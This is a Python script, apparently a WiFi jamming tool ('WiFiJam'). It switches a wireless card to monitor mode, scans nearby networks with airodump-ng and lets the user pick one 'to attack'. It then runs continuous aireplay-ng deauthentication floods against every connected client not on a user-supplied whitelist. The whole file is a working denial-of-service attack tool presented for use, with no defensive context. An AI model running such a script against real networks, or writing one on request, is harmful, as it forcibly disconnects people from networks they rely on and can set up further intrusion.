#!/usr/bin/env python3

#!/usr/bin/python3 

import csv
from datetime import datetime
import os
import re
import shutil
import subprocess
import threading
import time

def in_sudo_mode():
    if not 'SUDO_UID' in os.environ.keys():
        print("Try running this program with sudo.")
        exit()

def find_nic():
    result = subprocess.run(["iw", "dev"], capture_output=True).stdout.decode()
    network_interface_controllers = wlan_code.findall(result)
    return network_interface_controllers

def set_monitor_mode(controller_name):
    subprocess.run(["ip", "link", "set", wifi_name, "down"])
    subprocess.run(["airmon-ng", "check", "kill"])
    subprocess.run(["iw", wifi_name, "set", "monitor", "none"])
    subprocess.run(["ip", "link", "set", wifi_name, "up"])

def set_band_to_monitor(choice):
    if choice == "0":
        subprocess.Popen(["airodump-ng", "--band", "bg", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    elif choice == "1":
        subprocess.Popen(["airodump-ng", "--band", "a", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)        
    else:
        subprocess.Popen(["airodump-ng", "--band", "abg", "-w", "file", "--write-interval", "1", "--output-format", "csv", wifi_name], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def backup_csv():
    for file_name in os.listdir():
        if ".csv" in file_name:
            print("There shouldn't be any .csv files in your directory. We found .csv files in your directory.")
            directory = os.getcwd()
            try:
                os.mkdir(directory + "/backup/")
            except:
                print("Backup folder exists.")
            timestamp = datetime.now()
            shutil.move(file_name, directory + "/backup/" + str(timestamp) + "-" + file_name)

def check_for_essid(essid, lst):
    check_status = True
    if len(lst) == 0:
        return check_status
    for item in lst:
        if essid in item["ESSID"]:
            check_status = False
    return check_status

def wifi_networks_menu():
    active_wireless_networks = list()
    try:
        while True:
            subprocess.call("clear", shell=True)
            for file_name in os.listdir():
                fieldnames = ['BSSID', 'First_time_seen', 'Last_time_seen', 'channel', 'Speed', 'Privacy', 'Cipher', 'Authentication', 'Power', 'beacons', 'IV', 'LAN_IP', 'ID_length', 'ESSID', 'Key']
                if ".csv" in file_name:
                    with open(file_name) as csv_h:
                        csv_h.seek(0)
                        csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                        for row in csv_reader:
                            if row["BSSID"] == "BSSID":
                                pass
                            elif row["BSSID"] == "Station MAC":
                                break
                            elif check_for_essid(row["ESSID"], active_wireless_networks):
                                active_wireless_networks.append(row)
            print("Scanning. Press Ctrl+C when you want to select which wireless network you want to attack.\n")
            print("No |\tBSSID              |\tChannel|\tESSID                         |")
            print("___|\t___________________|\t_______|\t______________________________|")
            for index, item in enumerate(active_wireless_networks):
                print(f"{index}\t{item['BSSID']}\t{item['channel'].strip()}\t\t{item['ESSID']}")
            time.sleep(1)
    except KeyboardInterrupt:
        print("\nReady to make choice.")
    while True:
        net_choice = input("Please select a choice from above: ")
        if active_wireless_networks[int(net_choice)]:
            return active_wireless_networks[int(net_choice)]
        print("Please try again.")

def set_into_managed_mode(wifi_name):
    subprocess.run(["ip", "link", "set", wifi_name, "down"])
    subprocess.run(["iwconfig", wifi_name, "mode", "managed"])
    subprocess.run(["ip", "link", "set", wifi_name, "up"])
    subprocess.run(["service", "NetworkManager", "start"])

def get_clients(hackbssid, hackchannel, wifi_name):
    subprocess.Popen(["airodump-ng", "--bssid", hackbssid, "--channel", hackchannel, "-w", "clients", "--write-interval", "1", "--output-format", "csv", wifi_name],  stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

def deauth_attack(network_mac, target_mac, interface):
    subprocess.Popen(["aireplay-ng", "--deauth", "0", "-a", network_mac, "-c", target_mac, interface])

mac_address_regex = re.compile(r'(?:[0-9a-fA-F]:?){12}')
wlan_code = re.compile("Interface (wlan[0-9]+)")

print(r""" 
//////////////////////////////////////////////////
//__        ___ _____ _       _                 //
//\ \      / (_)  ___(_)     | | __ _ _ __ ___  //
// \ \ /\ / /| | |_  | |  _  | |/ _` | '_ ` _ \ //
//  \ V  V / | |  _| | | | |_| | (_| | | | | | |//
//   \_/\_/  |_|_|   |_|  \___/ \__,_|_| |_| |_|//
//////////////////////////////////////////////////
""")
print("\n****************************************************************")
print("\n* Copyright of *Vivek W*, 2024")
print("\n* 🔥GitHub:    github.com/AryanVBW")
print("\n* 🌐Site:     portfolio.aryanvbw.live")
print("\n* 💖Instagram: Aryan_Technolog1es")
print("\n* 📧Email:    admin@aryanvbw.live")
print("\n****************************************************************")

in_sudo_mode()
backup_csv()

macs_not_to_kick_off = list()

while True:
    print("Please enter the MAC Address(es) of the device(s) you don't want to kick off the network.")
    macs = input("Please use a comma separated list if more than one, ie 00:11:22:33:44:55,11:22:33:44:55:66 :")
    macs_not_to_kick_off = mac_address_regex.findall(macs)
    macs_not_to_kick_off = [mac.upper() for mac in macs_not_to_kick_off]
    if len(macs_not_to_kick_off) > 0:
        break
    print("You didn't enter valid Mac Addresses.")

while True:
    wifi_controller_bands = ["bg (2.4Ghz)", "a (5Ghz)", "abg (Will be slower)"]
    print("Please select the type of scan you want to run.")
    for index, controller in enumerate(wifi_controller_bands):
        print(f"{index} - {controller}")
    band_choice = input("Please select the bands you want to scan from the list above: ")
    try:
        if wifi_controller_bands[int(band_choice)]:
            band_choice = int(band_choice)
            break
    except:
        print("Please make a valid selection.")

network_controllers = find_nic()
if len(network_controllers) == 0:
    print("Please connect a network interface controller and try again!")
    exit()

while True:
    for index, controller in enumerate(network_controllers):
        print(f"{index} - {controller}")
    controller_choice = input("Please select the controller you want to put into monitor mode: ")
    try:
        if network_controllers[int(controller_choice)]:
            break
    except:
        print("Please make a valid selection!")

wifi_name = network_controllers[int(controller_choice)]

set_monitor_mode(wifi_name)
set_band_to_monitor(band_choice)
wifi_network_choice = wifi_networks_menu()
hackbssid = wifi_network_choice["BSSID"]
hackchannel = wifi_network_choice["channel"].strip()
get_clients(hackbssid, hackchannel, wifi_name)

active_clients = set()
threads_started = []

subprocess.run(["airmon-ng", "start", wifi_name, hackchannel])
try:
    while True:
        count = 0
        subprocess.call("clear", shell=True)
        for file_name in os.listdir():
            fieldnames = ["Station MAC", "First time seen", "Last time seen", "Power", "packets", "BSSID", "Probed ESSIDs"]
            if ".csv" in file_name and file_name.startswith("clients"):
                with open(file_name) as csv_h:
                    print("Running")
                    csv_h.seek(0)
                    csv_reader = csv.DictReader(csv_h, fieldnames=fieldnames)
                    for index, row in enumerate(csv_reader):
                        if index < 5:
                            pass
                        elif row["Station MAC"] in macs_not_to_kick_off:
                            pass
                        else:
                            active_clients.add(row["Station MAC"])
            print("Station MAC           |")
            print("______________________|")
            for item in active_clients:
                print(f"{item}")
                if item not in threads_started:
                    threads_started.append(item)
                    t = threading.Thread(target=deauth_attack, args=[hackbssid, item, wifi_name], daemon=True)
                    t.start()
except KeyboardInterrupt:
    print("\nStopping Deauth")

set_into_managed_mode(wifi_name)
